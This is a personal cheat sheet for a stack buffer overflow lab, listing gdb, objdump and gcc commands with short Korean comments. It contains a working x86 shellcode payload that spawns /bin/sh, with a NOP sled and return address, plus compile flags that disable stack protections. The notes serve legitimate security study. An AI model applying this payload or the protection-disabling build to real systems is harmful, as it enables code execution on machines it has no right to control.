# A sheet for later use

## gdb example
```
# run gdb quietly
gdb -q date

# set break point and run
set args “--help”
break __libc_start_main
run

# Investigate memory
frame
bt
info frame
info registers
x /16xw $esp
set *{start} = 0x20554c42

x/s ans_buf
x/xw &ans_flag
x/32xw &esp
```

## env execute
```
env -i PWD="/home/seed/stack_addresses" SHELL="/bin/bash" SHLVL=0 /home/seed/stack_addresses/ans_check5 <param>
env -i PWD="/home/seed/labs/lab3/stack_addresses" SHELL="/bin/bash" SHLVL=0 /home/seed/523/labs/lab3/stack_addresses/ans_check5 <param>
unset env LINES
unset env COLUMNS
break 
run $( python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x90'*24 + '\x6c\xfd\xff\xbf'")
```


## objdump
```
objdump -D ans_check5 | grep -B 1 exit

# grep -B 1 exit:  -B 1 : exit 찾고 그것만 보여주지 말고 그 전에 한줄도 보여주란 옵션
# grep -A 1 exit:  -A 1 : exit 찾고 그것만 보여주지 말고 그 에 한줄도 보여주란 옵션
```

## exec with python
```
./ans_check5 $(python -c "print ‘\xAA’*N + ‘\xef\xbe\xad\xde’")
```


## gcc
```
gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5

-fno-stack-protector : disables stack protection
-g : default debug information
-o : set output file name
-z execstack : marks the stack as executable
```


## gdb options
```
-q : 시작시 설명문구 없이 시작
list <line number> : Show the code
break <line nuber> : Set a break point
run <param> : keep executing. <param> is optional
c : after breaking, keep executing
dissass <function name> : Shows the disassembled code and it's memory address
bt : backtrace
set args <param> : Set run param
set <address> = <value> : Set <value> at the <address>\
i b : break information 보기
i r esp : information register esp
```
